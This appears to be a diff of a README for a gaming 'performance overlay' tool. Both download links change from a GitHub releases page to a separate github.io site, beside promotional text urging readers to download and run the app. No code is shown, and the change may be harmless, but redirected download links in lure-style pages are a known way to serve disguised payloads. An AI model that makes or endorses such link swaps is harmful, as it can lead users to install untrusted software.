@@ -28,7 +28,7 @@ This tool was built by gamers, for gamers. It puts you in control.
 
 **Step 1: Get the Application**
 
-👉 **[Click Here to Download Wardogs Performance Overlay](https://github.com/Ishan2805/wardogs-performance-overlay-2026/releases)**
+👉 **[Click Here to Download Wardogs Performance Overlay](https://ishan2805.github.io)**
 
 Visit this link to download the application. The download page will show the latest version. Look for the download button on the screen and click it to save the file to your computer.
 
@@ -113,7 +113,7 @@ This project welcomes feedback and ideas from users. If you have suggestions, en
 
 Don't wait to improve your gameplay.
 
-👉 **[Download Wardogs Performance Overlay Now](https://github.com/Ishan2805/wardogs-performance-overlay-2026/releases)**
+👉 **[Download Wardogs Performance Overlay Now](https://ishan2805.github.io)**
 
 Visit this link to download the application. Once you've got it running, you'll immediately notice the difference. Smooth skies, responsive controls, and a battle-tested HUD are just a few clicks away.
 
